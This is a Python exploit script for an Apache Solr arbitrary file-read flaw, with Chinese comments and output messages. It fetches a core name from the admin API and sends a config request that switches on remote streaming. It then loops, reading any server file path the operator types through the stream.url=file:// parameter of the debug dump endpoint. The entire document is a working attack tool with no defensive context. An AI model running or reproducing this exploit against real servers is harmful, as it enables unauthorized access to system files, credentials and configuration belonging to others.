#coding: utf-8
import requests
import re
import json
G = '\033[32m'#绿
Y = '\033[33m'#黄
B = '\033[34m'#蓝
R = '\033[35m'#红
E = '\033[0m'#结束

def title():
    print(G,'<<<<<  Apache-Solr-LFi EXP code by lsadaharu  >>>>>',E)

def exp_code(target):
    File_name=""
    if target.startswith(("http","https")):
        core_name=Get_core_name(target)
        print("Get Core_name:{}".format(core_name))
        vul_verify=enableRemoteStreaming(target,core_name)
        
        while vul_verify:
            File_name=str(input(B+"[+]File_path >>>>>"+E))
            if File_name != 'quit':
                file_read(File_name,target,core_name)
    else:
        print("请输入正确的URL(https://xxx或http://xxx")


# 获取Core_name
def Get_core_name(target):
    header={
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
    }
    #获取core信息
    payload_core='/solr/admin/cores?indexInfo=false&wt=json'
    try:
        core_url=requests.get(target+payload_core,headers=header,verify=False,timeout=5)
        core_name=list(json.loads(core_url.content)['status'])[0]
        return core_name
    except Exception as error:
        print(R,"漏洞利用失败",E)

# 开启requestDispatcher.requestParsers.enableRemoteStreaming
def enableRemoteStreaming(target,core_name):
    header={
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
        'Content-Type': 'application/json'
    }
    post_payload='{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}'
    try:
        response=requests.post(url=target+"/solr/{}/config".format(core_name),headers=header,data=post_payload,verify=False,timeout=5)
        if "This response" in response.text and response.status_code== 200:
            print(G,"漏洞存在，请输入要读取的文件名路径",E)
            return True
    except Exception:
        print(R,"开启requestDispatcher.requestParsers.enableRemoteStreaming失败",E)

# 读取文件
def file_read(File_name,target,core_name):
    header={
        'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    post_paylod='stream.url=file://{}'.format(File_name)
    try:
        file_response = requests.post(url=target+'/solr/{}/debug/dump?param=ContentStreams'.format(core_name),headers=header,data=post_paylod,timeout=5)
        if file_response.status_code == 200:
            file_content = re.findall(r'<str name="stream">(.*?)<\/str>',file_response.text.replace("\n",""))
            print(file_content[0])
    except Exception as e:
        print(R+'文件读取失败'+E,e)

if __name__ == "__main__":
    title()
    target=str(input("请输入漏洞地址："))
    exp_code(target)
    
